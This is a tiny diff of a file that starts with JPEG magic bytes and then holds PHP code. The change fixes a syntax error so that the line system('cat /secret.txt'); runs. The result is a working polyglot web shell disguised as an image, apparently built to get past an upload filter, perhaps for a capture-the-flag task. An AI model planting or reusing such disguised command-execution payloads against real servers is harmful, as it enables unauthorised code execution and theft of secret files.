@@ -1,3 +1,3 @@
 ÿØÿ<?php
-system('cat /secret.txt']);
+system('cat /secret.txt');
 ?>
